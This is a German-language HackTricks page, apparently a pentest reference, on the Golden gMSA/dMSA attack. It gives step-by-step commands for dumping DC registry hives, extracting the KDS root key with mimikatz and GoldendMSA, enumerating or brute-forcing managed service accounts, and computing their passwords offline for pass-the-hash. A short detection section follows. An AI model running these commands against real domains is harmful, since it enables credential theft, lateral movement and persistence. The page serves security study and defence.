# Golden gMSA/dMSA Attack (Offline-Derivation von Managed Service Account-Passwörtern)

{{#include ../../banners/hacktricks-training.md}}

## Überblick

Windows Managed Service Accounts (MSA) sind spezielle Principals, die dafür ausgelegt sind, Services auszuführen, ohne dass deren Passwörter manuell verwaltet werden müssen.
Es gibt zwei Hauptvarianten:

1. **gMSA** – group Managed Service Account – kann auf mehreren Hosts verwendet werden, die in seinem Attribut `msDS-GroupMSAMembership` autorisiert sind.
2. **dMSA** – delegated Managed Service Account – der (als Preview verfügbare) Nachfolger von gMSA, der auf derselben Kryptografie basiert, aber granularere Delegation-Szenarien ermöglicht.

Bei beiden Varianten wird das **Passwort nicht** auf jedem Domain Controller (DC) wie ein regulärer NT-Hash gespeichert. Stattdessen kann jeder DC das aktuelle Passwort on-the-fly ableiten aus:

* Dem forestweiten **KDS Root Key** (`KRBTGT\KDS`) – einem zufällig generierten Secret mit GUID-Namen, das auf jeden DC unter dem Container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` repliziert wird.
* Der **SID** des Zielkontos.
* Einer kontospezifischen **ManagedPasswordID** (GUID), die im Attribut `msDS-ManagedPasswordId` zu finden ist.

Die Ableitung lautet: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-Byte-Blob, der schließlich **base64-kodiert** und im Attribut `msDS-ManagedPassword` gespeichert wird.
Während der normalen Passwortverwendung ist kein Kerberos-Traffic und keine Interaktion mit der Domain erforderlich – ein Member-Host leitet das Passwort lokal ab, solange er die drei Inputs kennt.

## Golden gMSA / Golden dMSA Attack

Wenn ein Angreifer alle drei Inputs **offline** erlangen kann, kann er **gültige aktuelle und zukünftige Passwörter** für **jedes gMSA/dMSA in der Forest** berechnen, ohne den DC erneut zu kontaktieren. Dadurch werden folgende Maßnahmen umgangen:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP-Read-Auditing
* Passwortänderungsintervalle (die Passwörter können im Voraus berechnet werden)

Dies ist vergleichbar mit einem *Golden Ticket* für Service Accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Voraussetzungen

1. **Kompromittierung auf Forest-Ebene** eines **DC** (oder Enterprise Admin) oder `SYSTEM`-Zugriff auf einen der DCs in der Forest.
2. Möglichkeit, Service Accounts aufzulisten (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64-Workstation zur Ausführung von [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) oder äquivalentem Code.

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key extrahieren

Von einem beliebigen DC dumpen (Volume Shadow Copy / rohe SAM+SECURITY-Hives oder Remote-Secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Der mit `RootKey` (GUID-Name) bezeichnete base64-String wird in späteren Schritten benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – gMSA- / dMSA-Objekte enumerieren

Rufe mindestens `sAMAccountName`, `objectSid` und `msDS-ManagedPasswordId` ab:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementiert Hilfsmodi:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID erraten / ermitteln (wenn nicht vorhanden)

Einige Deployments *entfernen* `msDS-ManagedPasswordId` aus ACL-geschützten Lesevorgängen.
Da die GUID 128-Bit lang ist, ist naives Bruteforcen nicht praktikabel, aber:

1. Die ersten **32 Bits = Unix-Epoch-Zeit** der Kontoerstellung (Auflösung: Minuten).
2. Danach folgen 96 zufällige Bits.

Daher ist eine **enge Wordlist pro Konto** (± wenige Stunden) realistisch.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Das Tool berechnet mögliche Passwörter und vergleicht deren Base64-Blob mit dem echten Attribut `msDS-ManagedPassword` – die Übereinstimmung verrät die korrekte GUID.

##### Phase 4 – Offline-Berechnung und Konvertierung des Passworts

Sobald die ManagedPasswordID bekannt ist, ist das gültige Passwort nur noch einen Befehl entfernt:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Die resultierenden Hashes können mit **mimikatz** (`sekurlsa::pth`) oder **Rubeus** für Kerberos abuse injiziert werden und ermöglichen unauffällige **lateral movement** sowie **persistence**.

## Erkennung & Abwehr

* Beschränken Sie die **DC backup and registry hive read**-Funktionen auf Tier-0-Administratoren.
* Überwachen Sie die Erstellung von **Directory Services Restore Mode (DSRM)** oder **Volume Shadow Copy** auf DCs.
* Prüfen Sie Lesezugriffe / Änderungen an `CN=Master Root Keys,…` und den `userAccountControl`-Flags von Dienstkonten.
* Erkennen Sie ungewöhnliche **base64 password writes** oder die plötzliche Wiederverwendung von Dienstpasswörtern auf mehreren Hosts.
* Erwägen Sie, privilegierte gMSAs in **classic service accounts** mit regelmäßigen zufälligen Rotationen umzuwandeln, wenn eine Tier-0-Isolierung nicht möglich ist.

## Tools

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – Referenzimplementierung, die auf dieser Seite verwendet wird.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – Referenzimplementierung, die auf dieser Seite verwendet wird.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket unter Verwendung abgeleiteter AES-Schlüssel.

## Referenzen

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
